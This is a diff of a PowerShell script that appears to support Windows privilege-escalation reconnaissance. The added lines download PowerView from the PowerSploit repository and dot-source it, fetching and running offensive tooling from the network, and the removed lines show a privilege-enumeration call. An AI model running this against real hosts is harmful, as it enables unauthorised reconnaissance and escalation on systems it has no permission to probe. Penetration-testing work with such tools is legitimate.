@@ -64,6 +64,23 @@ if (-not (Get-Module -Name PowerView -ListAvailable)) {
     Write-Output "PowerView module found"
 }
 
+Write-Host "`n"
+Write-Host "Importing powerview and powerup modules"
+## Import powerview and powerup modules
+## Check for PowerView module and download if missing
+if (-not (Get-Module -Name PowerView -ListAvailable)) {
+    Write-Output "PowerView module not found, downloading to current directory..."
+    try {
+        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
+        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
+        Write-Output "PowerView downloaded successfully"
+    } catch {
+        Write-Output "Could not download PowerView: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "PowerView module found"
+}
+
 ## Check for PowerUp module and download if missing
 if (-not (Get-Module -Name PowerUp -ListAvailable)) {
     Write-Output "PowerUp module not found, downloading to current directory..."
@@ -78,15 +95,9 @@ if (-not (Get-Module -Name PowerUp -ListAvailable)) {
     Write-Output "PowerUp module found"
 }
 
-## Use PowerView to get privileges if available
-if (Get-Module -Name PowerView -ListAvailable) {
+## Import PowerView script if available
+if (Test-Path ".\PowerView.ps1") {
     try {
-        $privileges2 = Get-NetEffectivePermission -ObjectName '' | Select-Object -ExpandProperty PrincipalProperty | ForEach-Object {$_.DisplayName}
-    } catch {
-        Write-Output "Could not get privileges with PowerView: $($_.Exception.Message)"
-    }
-} else {
-    Write-Output "PowerView module not available, skipping privilege enumeration"
-}
-Write-Host "`n"
-Write-Host "Privileges from PowerView:`n$($privileges2 -join "`n")"
+        Write-Output "Importing PowerView module..."
+        . ".\PowerView.ps1"
+        Write-Output "PowerView imported successfully"
